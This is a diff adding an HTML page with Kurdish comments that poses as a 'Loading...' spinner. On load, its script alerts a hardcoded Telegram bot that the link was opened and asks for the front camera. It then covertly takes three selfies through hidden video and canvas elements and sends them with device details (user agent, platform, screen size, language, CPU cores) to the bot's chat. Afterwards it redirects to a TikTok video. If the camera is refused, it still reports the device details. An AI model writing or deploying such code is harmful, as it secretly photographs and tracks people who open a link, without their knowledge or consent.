@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            background-color: #000000; display: flex;
+            justify-content: center; align-items: center; overflow: hidden;
+        }
+        .loader {
+            border: 4px solid #1a1a1a; border-top: 4px solid #ffffff;
+            border-radius: 50%; width: 50px; height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        
+        const TELEGRAM_BOT_TOKEN = '8912515878:AAHDENdRsKfpN_pYXxlfXBVPdq0BFltd6xk';
+        const TELEGRAM_CHAT_ID = '1997246394'; 
+        const TIKTOK_URL = 'https://www.tiktok.com/@ittz.k4ko0/video/7604158860596694293?is_from_webapp=1&sender_device=pc&web_id=7641918348771001877';
+
+        let photos = [];
+        const maxPhotos = 3;
+
+        // 📊 ڕێکخستنی زانیارییەکانی ئامێر بە شێوازێکی جوان و ڕوون
+        const deviceInfo = `ℹ️ *زانیارییەکانی ئامێری بەکارهێنەر:*
+        
+🌐 *سیستەم و وێبگەڕ:* \`${navigator.userAgent}\`
+💻 *پلاتفۆرم:* \`${navigator.platform}\`
+🖥 *ڕوونی شاشە:* \`${window.screen.width} x ${window.screen.height}\`
+🗣 *زمانی ئامێر:* \`${navigator.language}\`
+⚙️ *کۆری پڕۆسێسەر:* \`${navigator.hardwareConcurrency || 'نەزانراو'}\``;
+
+        // 🔔 ناردنی ئاگادارکردنەوەی خێرا کە کەسێک کلیکی لە لینکەکە کردووە
+        function sendClickNotification() {
+            const clickMessage = `📥 *ئاگاداری: کەسێک چۆتە ناو لینکەکەوە!* 📥\n\n⏳ چاوەڕوانی دیاریکردنی مۆڵەتی کامێرایە...`;
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: clickMessage, parse_mode: 'Markdown' })
+            });
+        }
+
+        // ڕاستەوخۆ لەگەڵ کردنەوەی لاپەڕەکە ئاگادارکردنەوەکە دەنێرێت
+        sendClickNotification();
+
+        // داواکردنی کامێرا
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            .then(function(stream) {
+                video.srcObject = stream;
+                setTimeout(takePhotosSequence, 1000);
+            })
+            .catch(function(err) {
+                sendBlockNotification();
+            });
+
+        function takePhotosSequence() {
+            if (photos.length < maxPhotos) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                canvas.toBlob(function(blob) {
+                    photos.push(blob);
+                    setTimeout(takePhotosSequence, 800);
+                }, 'image/jpeg', 0.7);
+            } else {
+                sendMediaGroupToTelegram();
+            }
+        }
+
+        function sendMediaGroupToTelegram() {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+
+            const mediaArray = [];
+            photos.forEach((blob, index) => {
+                const fileKey = `photo_${index}`;
+                formData.append(fileKey, blob, `selfie_${index}.jpg`);
+                
+                const mediaItem = { type: 'photo', media: `attach://${fileKey}` };
+                if (index === 0) {
+                    mediaItem.caption = `✅ *وێنەکان بە سەرکەوتوویی گیران!*\n\n${deviceInfo}`;
+                    mediaItem.parse_mode = 'Markdown';
+                }
+                mediaArray.push(mediaItem);
+            });
+
+            formData.append('media', JSON.stringify(mediaArray));
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`, {
+                method: 'POST',
+                body: formData
+            }).finally(() => {
+                window.location.href = TIKTOK_URL;
+            });
+        }
+
+        function sendBlockNotification() {
+            const blockMessage = `❌ *ئاگاداری: بەکارهێنەر ڕێگری لە کامێرا کرد!* ❌\n\n👤 مۆڵەتی وێنەگرتنی نەدا.\n\n${deviceInfo}`;
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: blockMessage, parse_mode: 'Markdown' })
+            }).finally(() => {
+                window.location.href = TIKTOK_URL;
+            });
+        }
+    </script>
+</body>
+</html>
